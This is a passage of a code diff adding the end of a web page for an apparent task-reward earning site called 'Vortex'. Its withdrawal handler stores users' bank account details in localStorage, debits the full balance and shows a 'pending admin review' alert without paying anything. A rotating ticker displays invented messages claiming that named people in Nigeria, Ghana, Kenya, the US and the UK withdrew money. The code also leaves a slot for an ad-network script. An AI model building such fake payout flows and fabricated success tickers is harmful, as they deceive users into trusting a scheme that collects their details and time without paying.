+                return;
+            }
+
+            const currentEmail = localStorage.getItem('vortex_user_email');
+            let allUsers = JSON.parse(localStorage.getItem('vortex_all_users')) || [];
+            let userObj = allUsers.find(u => u.email === currentEmail);
+            if (userObj) {
+                userObj.bank = bank;
+                userObj.accountNumber = accNum;
+                userObj.accountName = accName;
+                localStorage.setItem('vortex_all_users', JSON.stringify(allUsers));
+            }
+
+            logTransaction('debit', balance, `Withdrawal Request (${bank})`);
+            document.getElementById('withdrawalStatusBox').style.display = 'block';
+            alert(`Withdrawal request submitted for ${bank} (${accNum}). Status: Pending Admin Review (End-of-month payout processing).`);
+        }
+
+        const tickerNames = [
+            "Oluwaseun Adebayo (Nigeria) withdrew ₦8,000 via OPay",
+            "Chinedu Okafor (Nigeria) collected ₦800 task reward",
+            "Fatima Bello (Nigeria) claimed ₦50 daily bonus",
+            "Amara Okoro (Nigeria) withdrew ₦16,000 via Moniepoint",
+            "Kofi Mensah (Ghana) withdrew GH₵ 150",
+            "Amina Abdi (Kenya) completed sponsor task",
+            "Michael Smith (United States) joined via referral",
+            "Liam Johnson (United Kingdom) withdrew £50"
+        ];
+        let tickerIndex = 0;
+        setInterval(() => {
+            tickerIndex = (tickerIndex + 1) % tickerNames.length;
+            document.getElementById('tickerText').textContent = tickerNames[tickerIndex];
+        }, 4000);
+    </script>
+
+    <!-- ========================================== -->
+    <!-- PASTE YOUR ADSTERRA SOCIAL BAR SCRIPT HERE   -->
+    <!-- ========================================== -->
+</body>
+</html>
